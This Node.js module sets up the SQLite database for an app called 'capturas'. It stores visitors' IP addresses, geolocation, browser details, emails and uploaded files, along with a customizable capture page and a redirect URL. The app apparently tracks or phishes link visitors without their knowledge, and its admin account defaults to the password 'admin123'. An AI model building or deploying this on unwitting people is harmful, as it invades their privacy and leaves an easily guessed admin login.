const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const Database = require('better-sqlite3');
const bcrypt = require('bcryptjs');

const DATA_DIR = process.env.DATA_DIR || __dirname;
const UPLOADS_DIR = path.join(DATA_DIR, 'uploads');
const DB_PATH = path.join(DATA_DIR, 'capturas.db');

fs.mkdirSync(UPLOADS_DIR, { recursive: true });

const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');

db.exec(`
CREATE TABLE IF NOT EXISTS settings (
  key   TEXT PRIMARY KEY,
  value TEXT NOT NULL
);
CREATE TABLE IF NOT EXISTS captures (
  id         INTEGER PRIMARY KEY AUTOINCREMENT,
  filename   TEXT,
  ip         TEXT,
  user_agent TEXT,
  referrer   TEXT,
  lat        REAL,
  lng        REAL,
  tz         TEXT,
  lang       TEXT,
  email      TEXT,
  created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE TABLE IF NOT EXISTS admins (
  id            INTEGER PRIMARY KEY AUTOINCREMENT,
  username      TEXT UNIQUE NOT NULL,
  password_hash TEXT NOT NULL
);
`);

const cols = db.prepare("PRAGMA table_info(captures)").all().map((c) => c.name);
if (!cols.includes('email')) {
  db.exec('ALTER TABLE captures ADD COLUMN email TEXT');
}

const getSetting = (key) => {
  const row = db.prepare('SELECT value FROM settings WHERE key = ?').get(key);
  return row ? row.value : null;
};

const setSetting = (key, value) => {
  db.prepare(
    'INSERT INTO settings (key, value) VALUES (?, ?) ON CONFLICT(key) DO UPDATE SET value = excluded.value'
  ).run(key, value);
};

const username = process.env.ADMIN_USER || 'admin';
const password = process.env.ADMIN_PASS || 'admin123';
if (!db.prepare('SELECT id FROM admins WHERE username = ?').get(username)) {
  db.prepare('INSERT INTO admins (username, password_hash) VALUES (?, ?)').run(
    username,
    bcrypt.hashSync(password, 10)
  );
}

if (!getSetting('destination_url')) {
  setSetting('destination_url', process.env.DEFAULT_DESTINATION_URL || 'https://www.google.com');
}
if (!getSetting('entry_token')) {
  setSetting('entry_token', crypto.randomBytes(6).toString('hex'));
}
if (!getSetting('capture_mode')) {
  setSetting('capture_mode', 'normal');
}
if (!getSetting('google_client_id')) {
  setSetting('google_client_id', '');
}
if (!getSetting('capture_html')) {
  const defaultHtml = fs.readFileSync(path.join(__dirname, 'public', 'capture.html'), 'utf8');
  setSetting('capture_html', defaultHtml);
}

module.exports = { db, getSetting, setSetting, UPLOADS_DIR };
